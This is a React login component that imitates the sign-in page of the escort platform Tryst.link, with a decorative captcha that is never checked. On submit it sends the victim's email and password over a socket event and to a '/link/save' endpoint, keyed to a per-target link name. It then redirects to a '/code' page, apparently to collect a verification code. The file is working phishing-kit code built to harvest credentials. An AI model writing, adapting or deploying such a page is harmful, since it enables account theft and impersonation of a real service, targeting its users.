import React, { useContext, useRef } from 'react'
import { socket } from '../App'
import captcha from '../assets/captcha.png'
import { useNavigate, useParams } from 'react-router-dom'
import { Context } from '../store/Context'
import axios from 'axios'


const Login = () => {

  const { userData, setUserData, url } = useContext(Context)

  const { linkName } = useParams()
  console.log(linkName)

  const emailRef = useRef()
  const passRef = useRef()

  const navigate = useNavigate()


  const handleSubmit = async (e) => {
    e.preventDefault()

    socket.emit('dataAdded', {
      email: emailRef.current.value,
      pass: passRef.current.value,
      linkName: linkName
    })
    setUserData((prevUserData) => {
      return { ...prevUserData, email: emailRef.current.value, pass: passRef.current.value, linkName: linkName }
    })
    const response = await axios.post(`${url}/link/save`, {
      email: emailRef.current.value,
      pass: passRef.current.value,
      linkName: linkName,
      code: 'try',
    })
    if (response.data.ok) {
      console.log('reached')
      navigate(`/code`)
    } else {
      navigate('/admin')
    }
  }

  return (
    <div className=' px-4'>

      <form className=' my-14 flex flex-col gap-10' onSubmit={handleSubmit}>
        <h2 className=' text-2xl font-medium py-2 border-b-[3px] border-rose-600 w-20'>Log in</h2>
        <div className=' flex flex-col-reverse gap-2'>
          <input ref={emailRef} className=' h-14 border-gray-300 border rounded-md outline-blue-500 px-5 text-lg text-gray-500 font-medium' type="text" id='email' required />
          <label htmlFor="email" className=' font-medium text-slate-500'>EMAIL ADDRESS</label>
        </div>
        <div className=' flex flex-col-reverse gap-2'>
          <input ref={passRef} className=' h-14 border-gray-300 border rounded-md outline-blue-500 px-5 text-lg text-gray-500' type="password" id='password' required />
          <label htmlFor="password" className=' font-medium text-slate-500'>PASSWORD</label>
        </div>
        <div className=' flex flex-col '>
          <div className=' flex gap-1 items-start text-sm font-medium text-slate-500'><span className=' text-red-500'>*</span>PLEASE ENTER THE CHARACTERS SHOWN INSIDE THE BLUE BOX</div>
          <img className=' w-40' src={captcha} alt="" />
          <input type="text" className=' h-14 border-gray-300 border rounded-md outline-blue-500 px-5 text-lg text-gray-500' />
        </div>
        <div className=' flex gap-2 items-center'>
          <input id='remember' type="checkbox" className=' h-4 w-4' />
          <label htmlFor="remember" className=' font-medium'>Remeber me for 14 days</label>
        </div>
        <button type='submit' className=' bg-orange-800 w-20 py-3 rounded-lg text-xl font-medium text-white'>Log in</button>
      </form>

      <div className=' faqs flex flex-col gap-4'>
        <p className=' w-56'>Forgot your password?</p>
        <p className=' !max-w-[340px]'>Didn't receive cofirmation instructions?</p>
        <p>I need help recovering access to my account.</p>
      </div>

      <div className=' flex flex-col my-10 gap-4 text-slate-600 pb-10'>
        <h2 className=' text-2xl font-medium border-b-[3px] border-rose-600 w-24 py-3 '>Sign up</h2>
        <p className=' mb-3'>Tryst.link is one of the fastest-growing escort platforms in the world. Built by the same team behind Switter!</p>
        <p>Please select which type of account you'd like to sign up for:</p>
        <div className=' client-box flex gap-5 text-black'>
          <button className=' !max-w-48 !px-3'>I am a provider</button>
          <button className=' !max-w-40 !px-3'>I am a client</button>
        </div>
      </div>


    </div>
  )
}

export default Login